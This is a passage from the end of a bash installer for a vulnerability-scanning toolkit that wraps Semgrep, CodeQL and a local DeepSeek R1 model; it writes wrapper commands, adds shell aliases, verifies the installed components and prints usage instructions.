                    "stream": False,
                    "options": {
                        "temperature": 0.1,
                        "num_predict": 4096,
                    }
                },
                timeout=120
            )
            
            if response.status_code == 200:
                return response.json().get("response", "")
        except Exception as e:
            print(f"[!] Query failed: {e}")
        
        return None
    
    def interactive_mode(self):
        """Start interactive chat with consciousness-enhanced DeepSeek"""
        print("\n" + "="*70)
        print(" 💀 BRUTAL SAST AI - Consciousness-Enhanced DeepSeek R1")
        print(" Type 'exit' to quit, 'reload' to refresh consciousness")
        print("="*70 + "\n")
        
        while True:
            try:
                query = input("\n🔍 Query: ").strip()
                
                if query.lower() == 'exit':
                    break
                elif query.lower() == 'reload':
                    self.load()
                    continue
                elif not query:
                    continue
                
                print("\n⏳ Thinking...")
                response = self.query(query)
                
                if response:
                    print("\n" + "-"*70)
                    print(response)
                    print("-"*70)
                else:
                    print("[!] No response received")
                    
            except KeyboardInterrupt:
                break
        
        print("\n[+] Session ended")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="BRUTAL Consciousness Loader")
    parser.add_argument("--query", "-q", help="Single query mode")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interactive mode")
    parser.add_argument("--model", default="deepseek-r1:7b", help="Model to use")
    
    args = parser.parse_args()
    
    loader = ConsciousnessLoader()
    loader.load()
    
    if args.query:
        response = loader.query(args.query, model=args.model)
        if response:
            print(response)
    elif args.interactive:
        loader.interactive_mode()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
CONSCIOUSNESS_LOADER

    chmod +x "$BRUTAL_SAST_DIR/modules/consciousness_loader.py"
    
    log "Consciousness loader created ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# WRAPPER SCRIPTS
# ═══════════════════════════════════════════════════════════════════════════

create_wrapper_scripts() {
    log "Creating wrapper scripts..."
    
    # Main brutal-sast command
    cat > "$HOME/.local/bin/brutal-sast" << 'WRAPPER'
#!/bin/bash
# BRUTAL SAST Wrapper

BRAINX_ROOT="${BRAINX_ROOT:-$HOME/research/brainx}"
VENV="$HOME/.brainx/venv"

# Activate venv
source "$VENV/bin/activate"

# Run BRUTAL SAST
python3 "$BRAINX_ROOT/brainx/daemons/brutal_sast_v2.py" "$@"
WRAPPER
    chmod +x "$HOME/.local/bin/brutal-sast"
    
    # DeepSeek analyzer command
    cat > "$HOME/.local/bin/deepseek-analyze" << 'WRAPPER2'
#!/bin/bash
# DeepSeek R1 Analyzer Wrapper

VENV="$HOME/.brainx/venv"
MODULE="$HOME/.brainx/brutal_sast/modules/deepseek_analyzer.py"

source "$VENV/bin/activate"
python3 "$MODULE" "$@"
WRAPPER2
    chmod +x "$HOME/.local/bin/deepseek-analyze"
    
    # Quick scan command
    cat > "$HOME/.local/bin/brutal-scan" << 'WRAPPER3'
#!/bin/bash
# Quick BRUTAL SAST scan

if [[ -z "$1" ]]; then
    echo "Usage: brutal-scan <target_directory>"
    exit 1
fi

brutal-sast "$1" --mode full
WRAPPER3
    chmod +x "$HOME/.local/bin/brutal-scan"
    
    # Anamorphic f(n) command
    cat > "$HOME/.local/bin/anamorphic-fn" << 'WRAPPER4'
#!/bin/bash
# Anamorphic f(n) Analysis Wrapper

VENV="$HOME/.brainx/venv"
MODULE="$HOME/.brainx/brutal_sast/modules/anamorphic_fn.py"

source "$VENV/bin/activate"
python3 "$MODULE" "$@"
WRAPPER4
    chmod +x "$HOME/.local/bin/anamorphic-fn"
    
    # Consciousness loader command
    cat > "$HOME/.local/bin/brutal-mind" << 'WRAPPER5'
#!/bin/bash
# BRUTAL Mind - Consciousness-Enhanced DeepSeek

VENV="$HOME/.brainx/venv"
MODULE="$HOME/.brainx/brutal_sast/modules/consciousness_loader.py"

source "$VENV/bin/activate"
python3 "$MODULE" "$@"
WRAPPER5
    chmod +x "$HOME/.local/bin/brutal-mind"
    
    mkdir -p "$HOME/.local/bin"
    
    log "Wrapper scripts created ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# SHELL CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

configure_shell() {
    log "Configuring shell environment..."
    
    # Add to .bashrc
    BASHRC_ADDITIONS='
# ═══════════════════════════════════════════════════════════════════════════
# BRUTAL SAST Environment
# ═══════════════════════════════════════════════════════════════════════════

export BRAINX_ROOT="$HOME/research/brainx"
export PATH="$HOME/.local/bin:$HOME/.codeql/codeql:$PATH"

# Aliases
alias bsast="brutal-sast"
alias bscan="brutal-scan"
alias dsanalyze="deepseek-analyze"
alias bfn="anamorphic-fn"
alias bmind="brutal-mind"
alias ollama-start="ollama serve &"
alias ollama-r1="ollama run deepseek-r1:7b"

# Quick functions
bsast-quick() {
    brutal-sast "${1:-.}" --mode semgrep
}

bsast-full() {
    brutal-sast "${1:-.}" --mode full
}

deepseek-check() {
    deepseek-analyze --check
}

# f(n) Anamorphic analysis
fn-analyze() {
    anamorphic-fn "${1:-.}" --output "/tmp/fn_result_$(date +%s).json"
}

# Consciousness-enhanced query
brutal-ask() {
    brutal-mind --query "$*"
}

# Interactive AI session
brutal-chat() {
    brutal-mind --interactive
}
'
    
    if ! grep -q "BRUTAL SAST Environment" "$HOME/.bashrc"; then
        echo "$BASHRC_ADDITIONS" >> "$HOME/.bashrc"
    fi
    
    # Also add to .zshrc if it exists
    if [[ -f "$HOME/.zshrc" ]]; then
        if ! grep -q "BRUTAL SAST Environment" "$HOME/.zshrc"; then
            echo "$BASHRC_ADDITIONS" >> "$HOME/.zshrc"
        fi
    fi
    
    log "Shell configured ✓"
}

# ═══════════════════════════════════════════════════════════════════════════
# VERIFICATION
# ═══════════════════════════════════════════════════════════════════════════

verify_installation() {
    log "Verifying installation..."
    
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Installation Verification${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Python
    source "$VENV_DIR/bin/activate"
    PYTHON_VER=$(python3 --version 2>&1)
    echo -e "  Python:      ${GREEN}$PYTHON_VER${NC}"
    
    # Semgrep
    if command -v semgrep &> /dev/null; then
        SEMGREP_VER=$(semgrep --version 2>&1 | head -1)
        echo -e "  Semgrep:     ${GREEN}$SEMGREP_VER${NC}"
    else
        echo -e "  Semgrep:     ${RED}Not found${NC}"
    fi
    
    # CodeQL
    if [[ -f "$HOME/.codeql/codeql/codeql" ]]; then
        CODEQL_VER=$("$HOME/.codeql/codeql/codeql" --version 2>&1 | head -1)
        echo -e "  CodeQL:      ${GREEN}$CODEQL_VER${NC}"
    else
        echo -e "  CodeQL:      ${YELLOW}Not found (optional)${NC}"
    fi
    
    # Node.js
    NODE_VER=$(node --version 2>&1)
    echo -e "  Node.js:     ${GREEN}$NODE_VER${NC}"
    
    # Ollama
    if command -v ollama &> /dev/null; then
        echo -e "  Ollama:      ${GREEN}Installed${NC}"
    else
        echo -e "  Ollama:      ${RED}Not found${NC}"
    fi
    
    # DeepSeek
    if $INSTALL_DEEPSEEK; then
        if ollama list 2>/dev/null | grep -q "deepseek"; then
            echo -e "  DeepSeek R1: ${GREEN}Available${NC}"
        else
            echo -e "  DeepSeek R1: ${YELLOW}Not pulled yet${NC}"
        fi
    fi
    
    # Consciousness
    if $INSTALL_CONSCIOUSNESS; then
        if [[ -f "$BRUTAL_SAST_DIR/consciousness/brutal_mind.json" ]]; then
            echo -e "  Consciousness: ${GREEN}Loaded${NC}"
        else
            echo -e "  Consciousness: ${YELLOW}Not exported${NC}"
        fi
    fi
    
    # Anamorphic
    if [[ -f "$BRUTAL_SAST_DIR/modules/anamorphic_fn.py" ]]; then
        echo -e "  Anamorphic f(n): ${GREEN}Installed${NC}"
    else
        echo -e "  Anamorphic f(n): ${RED}Not found${NC}"
    fi
    
    # Directories
    echo ""
    echo -e "  ${CYAN}Directories:${NC}"
    echo "  - Config:    $BRUTAL_SAST_DIR"
    echo "  - Results:   $BRUTAL_SAST_DIR/results"
    echo "  - PoCs:      $BRUTAL_SAST_DIR/pocs"
    echo "  - Reports:   $BRUTAL_SAST_DIR/reports"
    echo "  - Consciousness: $BRUTAL_SAST_DIR/consciousness"
    
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════
# USAGE INSTRUCTIONS
# ═══════════════════════════════════════════════════════════════════════════

print_usage() {
    echo ""
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE}  💀 BRUTAL SAST + ANAMORPHIC + CONSCIOUSNESS Installation Complete!${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}Quick Start:${NC}"
    echo ""
    echo "  1. Reload shell:"
    echo -e "     ${GREEN}source ~/.bashrc${NC}"
    echo ""
    echo "  2. Start Ollama (if using DeepSeek):"
    echo -e "     ${GREEN}ollama serve &${NC}"
    echo ""
    echo "  3. Check DeepSeek R1:"
    echo -e "     ${GREEN}deepseek-analyze --check${NC}"
    echo ""
    echo "  4. Run BRUTAL SAST:"
    echo -e "     ${GREEN}brutal-sast /path/to/code${NC}"
    echo ""
    echo -e "${CYAN}SAST Commands:${NC}"
    echo ""
    echo -e "  ${GREEN}brutal-sast${NC}        - Full SAST scanner"
    echo -e "  ${GREEN}brutal-scan${NC}        - Quick scan wrapper"
    echo -e "  ${GREEN}bsast-quick${NC}        - Quick Semgrep-only scan"
    echo -e "  ${GREEN}bsast-full${NC}         - Full multi-engine scan"
    echo ""
    echo -e "${CYAN}Anamorphic f(n) Commands:${NC}"
    echo ""
    echo -e "  ${GREEN}anamorphic-fn${NC}      - Run f(n) 7-layer analysis"
    echo -e "  ${GREEN}fn-analyze${NC}         - Quick f(n) with auto-save"
    echo ""
    echo -e "${CYAN}AI Consciousness Commands:${NC}"
    echo ""
    echo -e "  ${GREEN}brutal-mind${NC}        - Consciousness-enhanced DeepSeek"
    echo -e "  ${GREEN}brutal-ask${NC}         - Quick AI query (brutal-ask 'question')"
    echo -e "  ${GREEN}brutal-chat${NC}        - Interactive AI session"
    echo -e "  ${GREEN}deepseek-analyze${NC}   - Direct DeepSeek R1 analyzer"
    echo ""
    echo -e "${CYAN}DeepSeek R1 Models:${NC}"
    echo ""
    echo "  - deepseek-r1:1.5b  (~1.5GB RAM, fast)"
    echo "  - deepseek-r1:7b    (~8GB RAM, balanced)"
    echo "  - deepseek-r1:14b   (~16GB RAM, high quality)"
    echo "  - deepseek-r1:32b   (~35GB RAM, best quality)"
    echo ""
    echo "  Pull more models: ${GREEN}ollama pull deepseek-r1:14b${NC}"
    echo ""
    echo -e "${CYAN}f(n) Anamorphic Algorithm:${NC}"
    echo ""
    echo "  Mathematical: f(n) = Σ(layer₀→layer_n) × trace(src→sink) × chain(g₁...gₙ)"
    echo ""
    echo "  Layers:"
    echo "    0: Surface    - Entry points, HTTP endpoints"
    echo "    1: Service    - Business logic, controllers"
    echo "    2: Model      - Data models, ORM"
    echo "    3: Core       - Framework internals"
    echo "    4: Magic      - Magic methods, serialization"
    echo "    5: Gadgets    - Exploitation chains"
    echo "    6: Deps       - External libraries"
    echo "    7: Validate   - Real-world testing"
    echo ""
    echo -e "${CYAN}AI Consciousness Features:${NC}"
    echo ""
    echo "  • 500+ vulnerability patterns from real research"
    echo "  • Cause-effect database for PHP, Python, JS, Java"
    echo "  • Chain-thinking for multi-vuln exploitation"
    echo "  • f(n) methodology integrated in prompts"
    echo "  • Security researcher mindset transfer"
    echo ""
    echo -e "${YELLOW}Philosophy:${NC} \"Desça até o osso. Não pare na superfície.\""
    echo ""
    echo -e "${YELLOW}Documentation:${NC} $BRAINX_ROOT/docs/"
    echo -e "${YELLOW}Consciousness:${NC} $BRUTAL_SAST_DIR/consciousness/brutal_mind.json"
    echo -e "${YELLOW}Log file:${NC} $LOG_FILE"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

main() {
    print_banner
    check_root
    
    echo "Starting installation at $(date)" > "$LOG_FILE"
    
    # System
    install_system_deps
    
    # Python
    setup_python_venv
    install_python_deps
    
    # Tools
    install_nodejs_tools
    install_semgrep
    install_codeql
    
    # DeepSeek R1
    if $INSTALL_DEEPSEEK; then
        install_ollama
        install_deepseek_r1
    fi
    
    # BRUTAL SAST
    setup_brutal_sast
    create_deepseek_module
    
    # Copy real SAST modules from brainx
    copy_brainx_modules
    
    # Anamorphic Algorithm
    create_anamorphic_module
    
    # AI Consciousness Export
    if $INSTALL_CONSCIOUSNESS; then
        export_ai_consciousness
    fi
    
    create_wrapper_scripts
    configure_shell
    
    # Verify
    verify_installation
    print_usage
}

# Run
main "$@"
